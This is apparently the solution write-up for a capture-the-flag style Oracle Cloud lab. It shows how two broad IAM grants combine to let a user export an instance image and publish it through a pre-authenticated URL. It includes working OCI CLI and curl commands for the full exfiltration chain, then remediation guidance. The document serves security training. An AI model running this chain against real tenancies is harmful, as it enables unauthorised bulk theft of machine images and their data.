# SCN-COMPUTE-001: Solution

## Root cause

The test user's policy grants exactly two statements:

```
Allow group <group> to manage instance-family in compartment <compartment>
Allow group <group> to manage object-family in compartment <compartment>
```

`manage instance-family` covers, among other things, creating a custom
image from a running instance (`instance-images` resource-type,
`manage` verb: `INSTANCE_IMAGE_CREATE`). Oracle's own policy reference
for the Core Services notes that `instance-family` "includes extra
permissions beyond the sum of the permissions for the individual
resource-types included in instance-family," and image export to
Object Storage isn't separately named in that table. This lab's own
validation confirmed empirically that `manage instance-family` is
sufficient to export an image, not just create one. Source:
[Details for the Core Services](https://docs.oracle.com/en-us/iaas/Content/Identity/Reference/corepolicyreference.htm),
Oracle's own IAM policy reference documentation.

`manage object-family` covers creating a Pre-Authenticated Request:
the `buckets` resource-type table, `manage` verb, lists `PAR_MANAGE`,
and the API-operation mapping in the same reference lists
`CreatePreauthenticatedRequest` under `PAR_MANAGE`. Source:
[Details for Object Storage](https://docs.oracle.com/en-us/iaas/Content/Identity/Reference/objectstoragepolicyreference.htm).

Neither statement mentions exporting an image or creating a
pre-authenticated request. Each reads, in isolation, like scoped
operational access: someone who manages instances, someone who manages
application objects. Combined, they close a complete chain: take any
instance in the compartment, turn it into a portable image, hand that
image to anyone on the internet, no further credential required.

## How to confirm it, step by step

With the test user's credential:

```bash
IMAGE_ID=$(oci compute image create \
  --compartment-id <compartment-ocid> \
  --instance-id <source-instance-ocid> \
  --display-name exfil-image \
  --wait-for-state AVAILABLE \
  --query 'data.id' --raw-output)

oci compute image export to-object \
  --image-id "$IMAGE_ID" \
  --namespace <namespace> \
  --bucket-name <bucket> \
  --name exfil-image

# oci compute image export to-object has no --wait-for-state option;
# poll the bucket until the object shows up
oci os object head --namespace <namespace> --bucket-name <bucket> --name exfil-image

PAR_URL=$(oci os preauth-request create \
  --namespace <namespace> \
  --bucket-name <bucket> \
  --name exfil-par \
  --object-name exfil-image \
  --access-type ObjectRead \
  --time-expires "$(date -u -d '+1 hour' '+%Y-%m-%dT%H:%M:%SZ')" \
  --query 'data."access-uri"' --raw-output)

curl -sI "https://objectstorage.<region>.oraclecloud.com${PAR_URL}"
```

In this project's own validation run, the last `curl` returned
`HTTP/1.1 200 OK` with `Content-Length: 3035381760`, roughly 2.8GB, the
full exported image, fetched with no OCI credential at all.

Download it and mount its boot volume to reach the filesystem (a QCOW2
export, `--export-format QCOW2` on `image export to-object`, is the
simplest to mount locally with standard Linux tooling). Inside it,
`/home/opc/flag.txt` holds an `OCIGOAT{...}` flag generated fresh for
this deployment. Submit it with `ocigoat submit SCN-COMPUTE-001
<flag>`.

## What this does and doesn't prove

It proves that two individually reasonable `manage` verbs, one for
Compute, one for Object Storage, combine into a complete path from
"has access to an instance" to "that instance's full image is on the
open internet," without needing any additional permission. It doesn't
prove a flaw in either service. Each verb is documented, and the
combination is a policy-authoring decision, not unexpected behavior
from Compute or Object Storage individually. It doesn't prove the
exported image contains real sensitive data; the source instance in
this lab is a minimal fixture. It doesn't demonstrate any OCI alerting
or detection mechanism for anomalous image exports or PAR creation;
that wasn't researched as part of this scenario.

## Remediation

- Don't grant `manage instance-family` and `manage object-family`
  together to the same principal unless both are actually required.
  Split image-export responsibilities from object/PAR-management
  responsibilities where the operational model allows it.
- If a principal must create Pre-Authenticated Requests, scope the
  policy to specific buckets, not `object-family` in the whole
  compartment, so a PAR can't be minted over an image-export bucket it
  has no legitimate reason to touch.
- Treat image export capability as sensitive by default. It's a bulk
  data-extraction primitive for anything the instance's boot volume
  holds, not just a Compute convenience feature.
- Audit Pre-Authenticated Requests tenancy-wide on a schedule; a PAR
  has no login, no audit trail beyond its own creation event, and
  works for anyone holding the URL until it expires.
